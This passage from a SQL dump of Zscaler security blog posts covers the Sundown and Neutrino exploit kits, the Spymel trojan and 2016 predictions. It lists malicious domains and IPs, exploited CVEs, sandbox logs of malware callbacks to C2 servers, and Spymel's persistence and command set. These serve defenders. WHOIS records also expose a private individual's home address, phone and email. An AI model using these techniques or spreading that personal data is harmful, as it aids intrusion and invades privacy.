(http://pastebin.com/QN9WqzPn)\r\n\r\n \r\n\r\nWhois Samples\r\nDomain Name: MUSIK4LITTLEFINGERS.COM\r\nRegistry Domain ID: 1916653940_DOMAIN_COM-VRSN\r\nRegistrar WHOIS Server: whois.godaddy.com\r\nRegistrar URL: http://www.godaddy.com\r\nUpdate Date: 2015-04-05T16:22:42Z\r\nCreation Date: 2015-04-05T16:22:42Z\r\nRegistrar Registration Expiration Date: 2018-04-05T16:22:42Z\r\nRegistrant Name: Mark Lippman\r\nRegistrant Organization:\r\nRegistrant Street: 4 Cloverbrooke Court\r\nRegistrant City: Potomic\r\nRegistrant State/Province: Maryland\r\nRegistrant Postal Code: 20854\r\nRegistrant Country: US\r\nRegistrant Phone: +1.2404294083\r\nRegistrant Phone Ext:\r\nRegistrant Fax: +1.1\r\nRegistrant Fax Ext:\r\nRegistrant Email: mhlippman@gmail.com\r\nRegistry Admin ID:\r\nAdmin Name: Mark Lippman\r\nAdmin Organization:\r\nAdmin Street: 4 Cloverbrooke Court\r\nAdmin City: Potomic\r\nAdmin State/Province: Maryland\r\nAdmin Postal Code: 20854\r\nAdmin Country: US\r\nAdmin Phone: +1.2404294083\r\nAdmin Phone Ext:\r\nAdmin Fax: +1.1\r\nAdmin Fax Ext:\r\nAdmin Email: mhlippman@gmail.com\r\nRegistry Tech ID:\r\nTech Name: Mark Lippman\r\nTech Organization:\r\nTech Street: 4 Cloverbrooke Court\r\nTech City: Potomic\r\nTech State/Province: Maryland\r\nTech Postal Code: 20854\r\nTech Country: US\r\nTech Phone: +1.2404294083\r\nTech Phone Ext:\r\nTech Fax: +1.1\r\nTech Fax Ext:\r\nTech Email: mhlippman@gmail.com\r\nName Server: NS67.DOMAINCONTROL.COM\r\nName Server: NS68.DOMAINCONTROL.COM\r\n \r\n\r\n\r\nDomain Name: EVERYONEISMUSICAL.COM\r\n\r\nRegistry Domain ID: 1917710979_DOMAIN_COM-VRSN\r\n\r\nRegistrar WHOIS Server: whois.godaddy.com\r\n\r\nRegistrar URL: http://www.godaddy.com\r\n\r\nUpdate Date: 2015-06-04T12:18:00Z\r\n\r\nCreation Date: 2015-04-08T19:34:50Z\r\n\r\nRegistrar Registration Expiration Date: 2018-04-05T11:59:59Z\r\n\r\nRegistrar: GoDaddy.com, LLC\r\n\r\nRegistrar IANA ID: 146\r\n\r\nRegistrar Abuse Contact Email: abuse@godaddy.com\r\n\r\nRegistrar Abuse Contact Phone: +1.4806242505\r\n\r\nDomain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited\r\n\r\nDomain Status: clientUpdateProhibited http://www.icann.org/epp#clientUpdateProhibited\r\n\r\nDomain Status: clientRenewProhibited http://www.icann.org/epp#clientRenewProhibited\r\n\r\nDomain Status: clientDeleteProhibited http://www.icann.org/epp#clientDeleteProhibited\r\n\r\nRegistry Registrant ID: \r\n\r\nRegistrant Name: Michael Lippman\r\n\r\nRegistrant Organization: \r\n\r\nRegistrant Street: 4 Cloverbrooke Court\r\n\r\nRegistrant City: Potomic\r\n\r\nRegistrant State/Province: Maryland\r\n\r\nRegistrant Postal Code: 20854\r\n\r\nRegistrant Country: US\r\n\r\nRegistrant Phone: +1.2404298083\r\n\r\nRegistrant Phone Ext:\r\n\r\nRegistrant Fax: \r\n\r\nRegistrant Fax Ext:\r\n\r\nRegistrant Email: mhlippman@gmail.com\r\n\r\nRegistry Admin ID: \r\n\r\nAdmin Name: Michael Lippman\r\n\r\nAdmin Organization: \r\n\r\nAdmin Street: 4 Cloverbrooke Court\r\n\r\nAdmin City: Potomic\r\n\r\nAdmin State/Province: Maryland\r\n\r\nAdmin Postal Code: 20854\r\n\r\nAdmin Country: US\r\n\r\nAdmin Phone: +1.2404298083\r\n\r\nAdmin Phone Ext:\r\n\r\nAdmin Fax: \r\n\r\nAdmin Fax Ext:\r\n\r\nAdmin Email: mhlippman@gmail.com\r\n\r\nRegistry Tech ID: \r\n\r\nTech Name: Michael Lippman\r\n\r\nTech Organization: \r\n\r\nTech Street: 4 Cloverbrooke Court\r\n\r\nTech City: Potomic\r\n\r\nTech State/Province: Maryland\r\n\r\nTech Postal Code: 20854\r\n\r\nTech Country: US\r\n\r\nTech Phone: +1.2404298083\r\n\r\nTech Phone Ext:\r\n\r\nTech Fax: \r\n\r\nTech Fax Ext:\r\n\r\nTech Email: mhlippman@gmail.com\r\n\r\nName Server: NS37.DOMAINCONTROL.COM\r\n\r\nName Server: NS38.DOMAINCONTROL.COM', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/music-themed-malvertising-lead-angler');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (113, 'There Goes The Neighborhood -  Bad Actors On GMHOST Alexander Mulgin Serginovic', 'Ed Miles', 'January 12, 2016', 'Introduction\r\nWhether they encourage it or not, some network operators become known and favored by criminals such as those that operate exploit kit (EK) and malware infrastructure. After following up the Sundown EK recently pointed out by @malwareforme on the Threatglass database, we found Neutrino (looking like Angler) and other bad behavior in the same network \"neighborhood\".\r\n\r\nIt\'s not clear what reputation this hoster has within the underground community, but the Sundown and Neutrino campaigns both appeared within the same address space registered under \"Alexander Mulgin Serginovic\" (AMS) with the first Neutrino hits coinciding with the last few hits of Sundown\'s December 2015 campaign. We have not identified any link between these campaigns apart from the hoster, but we wanted to provide a quick look at some of these activities and the specific indicators we have seen.\r\n \r\nSundown Behavior\r\n\r\nOther analysts have observed the emergence of the Sundown EK (aka Beta Exploit Pack), with Kafeine in particular commenting that Sundown is a very simple EK compared to the more mature kits like Angler. This continues to be the case, however we have seen that the group operating Sundown has made adjustments, including some changes that happened in the midst of this campaign.\r\n\r\n \r\nInjects\r\nThe campaign on ForoMTB Sundown used a small malicious inject within one of the included JavaScript libraries:\r\n \r\n\r\n\r\nOn CinemaHD, we saw a basic IFRAME inserted directly into the page:\r\n \r\n\r\n \r\n\r\nGates\r\n\r\n \r\n\r\nDuring December we saw the gate \"millychiccolo[.]space/jhgrjhk.php\", and after the new year we have seen \"pienadigrazia[.]space/counter.php\" though we also saw direct traffic from the compromised sites.\r\n\r\nLanding Pages\r\n\r\n\r\nIn the past 45 days we have seen Sundown operate with various domains hosting the landing pages, but only on two different IPs: 81.94.199.16 and 185.86.77.160. The path component of the landing page has gone through several iterations. The early hits in this campaign were seen to \"millychiccolo[.]space/?9b5b49f7f8c07f43effe4aecc67bf254\". Later, the landing page path was encoded with base64 as such: \"millychiccolo.space/?OWI1YjQ5ZjdmOGMwN2Y0M2VmZmU0YWVjYzY3YmYyNTQ=\". It should be noted that this base64 string decodes to the same MD5-looking path used in the first instance. Sundown changed up the underlying \"MD5\" for the new year, and we have seen landing pages at \"arbitraryh.top/?NjExODEzY2MzNTkyZTkyYWYxZmNlYjExODQzMzAz\" (the path decodes to 611813cc3592e92af1fceb11843303).\r\n\r\n \r\n\r\nThese are some of the domains we saw delivering Sundown landing pages, exploits, and malware payloads:\r\n\r\n\r\nnomeatea.space\r\nmillychiccolo.space\r\npianolessons.co.vu\r\ntequeryomuch.space\r\nilsignoreconte.space\r\narbitraryh.top\r\npienadigrazia.space\r\n\r\n\r\n \r\n\r\nDespite the path changes, the behavior of the Sundown landing page is still quite simple: a \"carpet bombing\" where many or all possible exploits are tried, in some cases with multiple successes. An example of the exploitation flow:\r\n\r\n\r\nilsignoreconte[.]space/new/e/360a296ea1e0abb38f1080f5e802fb4b.html\r\nilsignoreconte[.]space/new/e/053d33558d578d2cafe77639209ab4d9.html\r\nilsignoreconte[.]space/new/e/49c58cc2b166b1a5b13eab5f472a4f7b.html\r\nilsignoreconte[.]space/new/e/49c58cc2b166b1a5b13eab5f472a4f7b.swf\r\n\r\n\r\nExploit Payloads\r\n\r\nSundown was seen sending the following exploit payloads:\r\npoc2.flv - CVE-2015-3113\r\n49c58cc2b166b1a5b13eab5f472a4f7b.swf - CVE-2015-5122\r\n865hkjjhgfhjrgjkgyjtyg6lkjthyrkljtgh.html - CVE-2015-2419\r\n8573855j6lhk4j54kl5jhk53j654364354.html - CVE-2013-2551\r\n8500d58389eba3b3820a17641449b81d.html - CVE-2014-6332\r\n360a296ea1e0abb38f1080f5e802fb4b.swf - CVE-2014-0515\r\n053d33558d578d2cafe77639209ab4d9.swf - CVE-2015-3113 (via poc2.flv)\r\n\r\n\r\nMalware Payloads\r\n\r\nThe delivery of the malware samples was another aspect of Sundown that we saw change. Through December 26, the malware payloads were downloaded from the URL \"tequeryomuch[.]space/new/download.php?d=9b5b49f7f8c07f43effe4aecc67bf254\". On the 27th we saw payloads coming from \"tequeryomuch[.]space/?NGFlY2M2N2JmMjU0&d=9b5b49f7f8c07f43effe4aecc67bf254\".\r\n\r\nSome of the samples we observed during this campaign:\r\n\r\n\r\nSample\r\n4BAEEE098C34B463EB8AC709B9BD9967 (the sample seen on Threatglass)\r\n\r\nBehavior\r\n{\"dropped_path\":\"C:\\\\Documents and Settings\\\\user\\\\Application Data\\\\ZlFZQkBA\\\\twunk_32.exe\",\"dropped_md5\":\"4BAEEE098C34B463EB8AC709B9BD9967\"}\r\n{\"dropped_path\":\"C:\\\\WINDOWS\\\\Tasks\\\\ZlFZQkBA.job\",\"dropped_md5\":\"22D5FD2A8675CF3B673D84716384AE8A\"}\r\n\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"5.206.60.129\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0, Content-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"178.137.82.42\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0, Content-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"213.231.31.192\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0, Content-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n\r\n\r\n\r\nSample\r\nD754B473AF45B8D3565C1323D29EAD51\r\n\r\nBehavior\r\n{\"dropped_path\":\"C:\\\\Documents and Settings\\\\user\\\\Application Data\\\\ZlFZQkBA\\\\taskman.exe\",\"dropped_md5\":\"D754B473AF45B8D3565C1323D29EAD51\"}\r\n{\"dropped_path\":\"C:\\\\WINDOWS\\\\Tasks\\\\ZlFZQkBA.job\",\"dropped_md5\":\"07808D2E9A1D1607FCB81C1E0CA03358\"}\r\n\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"109.251.77.14\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0\r\nContent-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"109.251.77.14\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0\r\nContent-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"imagescdn[.]ru/redir.php\",\"destIP\":\"213.111.238.98\",\"ua\":\"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/38.0\r\nContent-type: application/x-www-form-urlencoded\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n\r\n\r\n\r\nSample\r\n6580F61B8B1AABFE3CAD6983CA9B2505\r\n\r\nBehavior\r\n{\"dropped_path\":\"C:\\\\DOCUME~1\\\\user\\\\LOCALS~1\\\\Temp\\\\svchost.exe\",\"dropped_md5\":\"FAA8EA9027ED6B6C875C247E59285270\"}\r\n{\"dropped_path\":\"C:\\\\Documents and Settings\\\\user\\\\Application Data\\\\programutiliity\\\\filename.exe\",\"dropped_md5\":\"A1429E43D7F19EB893FCC5D7BD2B21E9\"}\r\n{\"dropped_path\":\"C:\\\\Documents and Settings\\\\user\\\\Start Menu\\\\Programs\\\\Startup\\\\filename.bat\",\"dropped_md5\":\"7C444F8193480F6DC571BB6483E60A6A\"}\r\n \r\n\r\n\r\nGeographic Distribution\r\n\r\nWe\'ve primarily seen this Sundown campaign affect users located in Spain, though this may have more to do with the fact that the primary infected site is a Spanish-language forum.\r\n\r\n \r\n\r\n\r\n \r\nControl Panel Login\r\n\r\nThough we did not make any efforts to break into the Control Panel, we found it interesting that the login portal was so readily available to anyone who bothered to poke around at all. It\'s definitely looking a little flashier since Kafeine\'s analysis.\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\nNeutrino Behavior\r\n\r\nNeutrino, like Sundown, operates in the shadow of Angler. In this case, the first signs of activity seen in the campaign actually look very much like Angler, so much so that Blue Coat\'s blog about the same activity was later updated to correct the identification. Regardless of whether the initial traffic is actually Angler or not, the campaign changed noticeably over the observed duration. The early stage of the campaign triggered Angler signatures from a variety of sources. As can be seen below, the code features the \"malware.dontneedcoffee.com\" test that has been common to Angler.\r\n \r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\nLater stages of the campaign showed more expected Neutrino behavior: where the first stage after the infected website was initially an Angler-alike landing page, the injected code instead directs users to an HTML page that loads a malicious Flash object. This can be clearly seen below in the side-by-side comparison.\r\n \r\n\r\n\r\n\r\nInfected Sites and Landing Pages\r\n\r\nMany of the sites serving this Neutrino campaign were registered under .CZ, the top-level domain (TLD) for the Czech Republic. Since full list is too long to include here, we have created a Pastebin with the data.\r\n\r\nWe saw landing pages served up from these IPs:\r\n185.86.77.52\r\n89.38.146.229\r\n37.157.195.55\r\n45.32.238.202\r\n185.12.178.219\r\n89.38.144.75 \r\nThe list of landing page domains is again too long to reproduce here, so please see our Pastebin for the data.\r\n\r\n \r\n\r\nPayloads\r\n\r\nWhile we did not observe a malicious payload from the \"Angler\" behavior, we found the later stage of the campaign delivered a CyrptoWall 4.0 payload. Shown below is the notice from the locker malware.\r\n \r\n\r\n\r\n\r\n\r\nGeographic Distribution\r\n\r\n\r\nThe geographic distribution of clients affected by this campaign is somewhat more dispersed than the Sundown campaign, though the majority of users were located in the US.\r\n \r\n\r\n\r\n\r\n\r\nMalware Command and Control\r\n\r\n\r\nIn addition to Sundown and Neutrino (with a case of multiple personality disorder), we also identified Necurs and Radamant callback activity on the AMS network. We include details of this activity below.\r\n\r\nNecurs Activity\r\n\r\nNecurs is a fairly well-known rootkit that is often distributed by EKs and spam e-mails. We did not identify the infection vector for this campaign, but we saw some post infection activity to a Necurs C&C server hosted by AMS. The AMS C&C is only one of many C&Cs we saw, but in an interesting trend, we saw the Necurs callback activity drop off almost entirely going into 2016.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nPlease find the list of Necurs callback IPs on our Pastebin.\r\n\r\n\r\nRadamant Activity\r\n\r\nRadamant is yet another file locker, that according to BleepingComputer just recently became available as of December 7 2015. While we haven\'t seen very widespread distribution of Radamant yet, we have seen examples from as early as December 4, attempting communication with a server at our new favorite hoster as seen below.\r\n\r\n \r\n\r\n\r\n{\"url\":\"checkip.dyndns.org/\",\"destIP\":\"91.198.22.70\",\"ua\":\"\",\"method\":\"GET\",\"destPort\":\"80\"}\r\n{\"url\":\"185[.]86.79.100/API.php\",\"destIP\":\"185.86.79.100\",\"ua\":\"\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"185[.]86.79.100/API.php\",\"destIP\":\"185.86.79.100\",\"ua\":\"\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"185[.]86.79.100/API.php\",\"destIP\":\"185.86.79.100\",\"ua\":\"\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n{\"url\":\"185[.]86.79.100/mask.php\",\"destIP\":\"185.86.79.100\",\"ua\":\"\",\"method\":\"POST\",\"destPort\":\"80\"}\r\n\r\nConclusion\r\n\r\n\r\nAMS may host many legitimate customers, and while we didn\'t intend to call them out specifically, we wanted to share some of the malicious behavior we have seen involving this network (and others) in an effort to help other defenders. ThreatLabZ will continue to monitor these campaigns and ensure protection for organizations using the Zscaler Internet security platform.', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/there-goes-neighborhood-bad-actors-gmhost-alexander-mulgin-serginovic');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (114, 'Yet Another Signed Malware - Spymel', 'Tarun Dewan', 'January 06, 2016', 'Introduction  ThreatLabZ came across yet another malware family where the authors are using compromised digital certificates to evade detection. The malware family in this case is the information stealing Trojan Spymel and involved a .NET executable signed with a legitimate DigiCert issued certificate.    The infection cycle typically starts with a malicious JavaScript file that arrives in a ZIP archive via e-mail attachment. Once the user opens the JavaScript file, it will download and install the malware executable on the victim machine.    The malicious JavaScript file, surprisingly, in this case is not obfuscated and easy to read as seen in screenshot below. The Trojan Spymel executable gets downloaded from a remote location hardcoded in the JavaScript.       	  		  			  		  		  			 Hardcoded URL for Spymel Download  		  	              Information Stealer - Trojan Spymel  The downloaded malware executable is a highly obfuscated .NET binary, which is digitally signed with a certificate issued to “SBO INVEST”. The certificate was promptly revoked by DigiCert when notified and, therefore, is not active in any attack. We noticed a newer variant arose within two weeks of the first variant, using another certificate issued to \"SBO INVEST\' that is also revoked.       	  		  			  		  		  			Certificate used to sign Spymel  		  	      Spymel Payload Hashes  4E86F05B4F533DD216540A98591FFAC2    2B52B5AA33A0A067C34563CC3010C6AF     Installation  Spymel drops itself as “svchost.exe” and “Startup32.1.exe” in the following location:    WinXP  %Application Data%\\ProgramFiles(32.1)\\svchost.exe  %User%\\Start Menu\\Programs\\Startup\\Startup32.1.exe    Win7  %AppData%\\Roaming\\ProgramFiles(32.1)\\svchost.exe  %AppData%\\Roaming\\Microsoft\\Windows\\StartMenu\\Programs\\Startup\\Startup32.1.exe     Following registry entries are created to remain persistent on the target system:    WinXP  HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run @ Sidebar(32.1)  HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run @  Sidebar(32.1)    Win7  HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Sidebar(32.1)  HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run Sidebar(32.1)    Spymel Trojan configuration data including Command & Control server and File & Registry information is hardcoded within the executable as seen below:       	  		  			  		  		  			Spymel settings  		  	      Module Information  During our analysis, we came across following modules in the malware executable:    Keylogging  This module logs all user keystrokes into a log file at the following location:    %Application Data%\\ProgramFiles(32.1)\\svchost.exe.tmp    Below snapshot shows the keylogging module where the name of the class is \"kyl\":       	  		  			  		  		  			Keylogging code  		  	    ProtectMe  This module allows Spymel to prevent the victim user from terminating malware and other running processes on the system using tools like TaskMgr, Procexp, ProcessHacker and Taskkill. The malware disables the \'OK\' button on the confirmation prompt for Process Explorer as seen below:         Microsoft Taskkill command won\'t work as expected either despite the SUCCESS notification:      Below is the code snippet of class “ProtectMe”:    	  		  			  		  		  			Code of ProtectMe class  		  	      The malware monitors application like Task Manager, Process Explorer, and Process Hacker. It uses GetForegroundWindow() API to get the handle of active window and changes it\'s functionality if process is from the above list.                             Network activity  It connects to a remote domain android.sh (213.136.92.111) on port 1216.  Upon successful connection, Spymel starts sending information about the active process window. Below is a screenshot of network capture:                                                awt<Base64 endcoded active window title>djamel  Below are some of the commands that the malware can receive from the Command & Control server:         	  		  			  			Command  			  			  			Description  			  		  		  			  			i  			  			  			Sends information about user name, OS name, running processes, Video module flag, active window title.  			  		  		  			  			GetDrives  			  			  			Information about drives in system.  			  		  		  			  			FileManager  			  			  			Information about folders and files for given location.  			  		  		  			  			Delete  			  			  			Deletes given file or folder  			  		  		  			  			Execute  			  			  			Executes given file.  			  		  		  			  			Rename  			  			  			Rename given file or folder  			  		  		  			  			sup  			  			  			Uninstall itself  			  		  		  			  			klogs  			  			  			Upload keylogging file to C&C. *  			  		  		  			  			klold  			  			  			Upload requested file to C&C *  			  		  		  			  			ks  			  			  			Search for given string in all keylogging files.  			  		  		  			  			dklold  			  			  			Delete given keylogging file.  			  		  		  			  			dp  			  			  			Sends Desktop snapshot  			  		  		  			  			dform  			  			  			Download file from give URL  			  		  		  			  			VideoMode  			  			  			On|Off video recording  			  		  		  			  			veUpdate  			  			  			Provide settings of video recording for specific processes.  			  		  	          *File contents will be encrypted using base64 encoding.         	  		  			  		  		  			Recording video of browser processes  		  	         Conclusion  Using digital certificate to disguise malware is common and Spymel is yet another example of this. Spymel is an information stealing malware that spies on all user activity on the compromised machine and relays it to the attacker. This malware typically arrives via spammed e-mail leveraging social engineering to infect the target system.    Zscaler’s ThreatLabZ has confirmed coverage for the initial downloader and Spymel payloads, ensuring protection for organizations using Zscaler’s Internet security platform.    Analysis by Tarun Dewan and Amandeep Kumar', 'Malware', 'https://www.zscaler.com/blogs/research/yet-another-signed-malware-spymel');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (115, '2016 Security Predictions', 'Michael Sutton', 'December 22, 2015', 'As the year comes to a close and winter sets in, we like to look back at the year that was and do our best to prepare for the year ahead. What would the holiday season be without yuletide cheer, excessive commercialization and of course…security predictions? Yes, it’s time to join my colleagues in the security industry, peer into my magical crystal ball and provide a glimpse of what is to come. Grab a nice hot beverage, curl up next to the fire and enjoy!    PII is the new hotness  2015 continued the trend of major retail data breaches resulting in bulk debit and credit card theft, but it also marked a shift that will accelerate in 2016. In the coming year, expect attackers to move away from targeting financial information and instead target personally identifiable information (PII). In 2015, we continued to see credit/debit card theft at the likes of America’s Thrift Stores, The Trump Hotel Collection, Hilton Hotel properties, Service Systems Associates, Hershey Park, Harbortouch and White Lodging, but in 2015 we also learned of major breaches in the healthcare (Anthem and CareFirst BlueCross BlueShield) and government (Office of Personnel Management) sectors that targeted PII. The quest for PII is being driven by two separate groups of attackers. While nation states desire PII for espionage, criminals are also shifting to PII as it is generally more valuable than credit and debit cards, which are getting more challenging to harvest in bulk due to greater awareness of the problem and new technology. Why would a social security number be of greater value than a credit card number, which can be used directly to procure goods and services? PII is highly sought after in the underground as it can be leveraged to commit financial fraud such as applying for credit, submitting false medical/insurance claims or filing fraudulent tax refunds. Whereas credit cards can be easily cancelled, changing one’s name, address and social security number generally isn’t an option, so the stolen data remains valuable for a longer period of time. The shift will be motivated in part by the push to move to Chip and PIN (aka EMV) debit and credit cards, which combat RAM scraping malware with tokenization. Don’t however expect credit and debit card fraud to disappear entirely as EMV technology has seen slow adoption in the US, despite an October 2015 deadline and the technology does nothing to combat card not present (online) theft. In 2016, attackers will increasingly target sectors known to store bulk PII including finance, healthcare and government entities to harvest valuable PII.    Trusted Partner Attacks   Breaking in through the front door isn’t always the best option as it tends to be be well defended. The same is true in cyber attacks. A head on assault is expected, but companies rely on a plethora of technology partners and often communicate with them through trusted digital channels. History suggests that enterprises aren’t doing enough to ensure that trusted partners maintain their security to the same standards that would be demanded if those services were delivered internally. In the past we have seen this with the Target breach which occurred when Fazio Mechanical, an HVAC vendor was compromised. Likewise, the OPM breach began with a compromise at KeyPoint Government Solutions. Compromised partner networks aren’t always used to directly access another network but can also play an indirect role in a broader attack. For example, attackers that ultimately targeted JPMorgan Chase, Scottrade and E-Trade for money laundering also compromised G2 Web Services LLC, which specialized in monitoring and blocking fraudulent banking transactions. Once inside the G2 network, they could ensure that their money laundering schemes went undetected. Enterprises are increasingly outsourcing technology to streamline costs in areas that are not a core focus. For attackers targeting a supplier that often has lesser security controls than the larger entity that it serves, a successful compromise can be a gold mine. Not only does the breach provide a backdoor into the original target, but it also opens doors to other enterprises being serviced by the same vendor. Hackers have learned from successful attacks exploiting such relationships and will accelerate their focus in this area in 2016. Enterprises need to extend security policies and procedures beyond their own systems and personnel. Trusted partners should be expected to adhere to the same security controls and be subjected to audit and penetration tests to ensure that they are adhering to agreed upon standards.    Ransomware 2.0 goes corporate  Ransomware has managed to hit a sweet spot. Users are all too willing to begrudgingly pay an expensive but not excessive ransom in exchange for the return of their precious data. Even the FBI are recommending that it’s easier to pay than fight. The wildly profitable CryptoLocker has attracted many clones since it was largely knocked offline following Operation Tovar. Many of these clones, including more popular variants such as CryptoWall and TorrentLocker largely followed the proven formula but we’re starting to see variations such as ransomware focused on Linux and mobile platforms. The former is especially important as it’s more likely to impact the websites and code repositories of enterprises, who in our experience are also very willing to pay up rather than risk losing critical intellectual property. Expect ransomware to become increasingly corporate focused in 2016 and as it does, enterprises won’t get away with paying consumer rates. The criminals behind the ransomware campaigns are savvy and once they realize that they’ve locked up source code and financial documents that haven’t been properly backed up, you can expect prices to skyrocket…and be paid.    The extortion data breach  The Sony Pictures, Ashley Madison and Hacking Team breaches all share a common theme – the goal of the attacks was to humiliate the respective companies and perhaps inflict financial damage. There did not however appear to be a profit motive in any of the attacks. Sony Pictures, after already having proven to be a vulnerable target after two successful attacks against the Play Station Network, had it’s dirty laundry aired by hackers allegedly backed by the North Korean government as retaliation for producing a satirical movie about their leader. Ashley Madison and Hacking Team are believed to be the victims of hacktivists that disagreed with their corporate philosophies. Despite what has been stated by the media, there is little to suggest that these were sophisticated attacks. Rather, once the attackers were able to gain access to the internal network, they were able to roam freely and collect troves of sensitive data from email and file servers, which was then dumped online. Criminals have no doubt taken notice of the extreme damage that small teams have been able to achieve and know all too well that some would be willing to pay millions to stay out of the headlines. This is one prediction that is likely already taking place but we’ve yet to hear about it as the attackers have held up their part of the bargain to remain quiet in exchange for the hush money.    No AV? No problem.  Foreshadowing the death of antivirus (AV) is hardly a bold prediction. Even AV executives are calling for it. While you won’t see a sudden wholesale move away from AV, as it remains the first line of defense for corporate PCs, we’re now hearing with some regularity, CTOs shifting away from paid AV solutions to ‘good enough’ free AV or solutions baked in at the O/S level, such as Microsoft’s Windows Defender or Apple’s File Quarantine (aka XProtect). As enterprises adapt to the Post-PC era, running an end user device without AV is no longer seen as a risky bet. OS X machines rarely run AV in a corporate environment and on iOS devices it’s not even an option. Enterprises realize that AV is focused on known vulnerabilities and they must free budget dollars to shift to more dynamic security controls capable of identifying and protecting against 0day and targeted attacks. With limited budgets, expect fewer enterprises to open the checkbook for host based AV, instead reallocating the funds to solutions such as network/cloud based sandboxing solutions.    Android finally cleans up it’s act  Android is well on it’s way to becoming the Windows of the mobile malware world. With 99% of mobile infections, Android is the only game in town when it comes to infected tablets and smartphones. Love it or hate it, Apple’s walled garden and refusal to allow downloads from third party app stores has paid security dividends. Sure, Google Play has Bouncer and he’s done a fine job of keeping the miscreants out, but that’s of limited value when users are willing to go to shady Chinese app stores to save a buck on Candy Crush. Google clearly knows that this will hurt them in the long run, especially in the enterprise space and began making changes with Marshmallow, the latest Android flavor when they switched to Granular App Permissions to make it more clear what control an app ultimately gains when installed. This however was a small step and Google will need to get much more aggressive going forward. Not wanting to lose ground in the enterprise, where Apple has now pivoted, they have little choice. While cutting off third party app store access altogether would alienate too much of the user base, expect the next iteration of Android to to start cracking down on third party app stores. Since Jelly Bean 4.2, embedded cloud based anti-virus scanning was added through the Verify Apps feature. While yet another improvement, this is clearly not enough as we regularly identify and blog about apps from alternate Android app stores that are malicious in nature. Google will need to take more drastic steps and a likely change is restricting the permissions available to apps not vetted through the Google Play submission process.  Expect side-loaded apps requesting Administrator permissions to become a thing of the past.  Some developers will push back, but Google will have little choice if they want to get malware under control. Google will also begin to mandate acceptable timeframes for patches and firmware upgrades, which are now largely under the control of the OEM partners. It does little good when new security features are added, but they’re unavailable to users with non-Nexus devices. These steps won’t eliminate Android malware, especially with Android’s slow O/S upgrade cycle, but they will raise the bar for third party app stores, just as Bouncer did for Google Play.    Terrorists catch the hacking bug  This last prediction is one that saddens me to write, but I feel is inevitable and one that can’t be ignored. Terror organizations are continually searching for new avenues to instill fear and they require significant funding to further their hateful agendas. Skilled hackers can aid on both fronts. Cyber attacks can clearly be used by terrorists to obtain intelligence for future attacks and we’re already seeing early signs of cyber attacks being used to cause physical damage. Last year, hackers caused significant damage to a German steel mill when they disabled systems responsible for controlling a blast furnace. This wasn’t just kids playing around either, as the attacks reportedly required substantial knowledge of industrial control systems in order to succeed. With almost all industries reliant on computerized systems, the potential attack surface is enormous. Hacking is also extremely lucrative. The CrytoLocker ransomware authors for example were able to make millions in just a few short months. Such potential is surely in the sights of terror organizations, especially those such as ISIS, which have shown a new affinity for being tech savvy when it comes to recruiting and propaganda. Sadly, terrorists won’t necessarily need to acquire the necessary skills themselves as there are no shortage of cyber criminals all too willing to rent their skills out to the highest bidder and look the other way.    Password reuse attacks decline  And now for some good news. Password reuse attacks will begin to decline. Attackers are quite happy to compromise virtually any site even if it’s not the endgame as they can generally recover information and resources that will aid in other attacks. It’s always of great benefit for an attacker when they’re able to uncover a database of unencrypted usernames and passwords, because human nature suggests that those same credentials are used at many, many other sites. Most people use a handful of passwords at best, therefore attackers will write scripts to attempt automated logins at popular social networking, banking, etc. sites to see if the credentials can be reused. This presents a real challenge for end users as they have no control over how their credentials are stored or secured once they’re turned over and in the event of a compromise, changing passwords to every site where those same credentials were used is generally an impossibility. Think of your favorite password that you’ve used over the years. How many sites have you used it on? You lost count, didn’t you. Fortunately, this is starting to change thanks in large part to the smartphone. Smartphones can be many things but they make for a handy secure, always with you, data repository. As such, people are starting to adopt password managers such as 1Password, LastPass, etc., as they have user friendly smartphone apps that present a convenient option for always having sensitive data such as passwords within easy reach. Advancements in biometrics are also helping the cause with consumer grade fingerprint scanners now becoming a standard feature on modern smartphones. This not only makes accessing that password repository quicker and more user friendly, but also finally makes it an option to 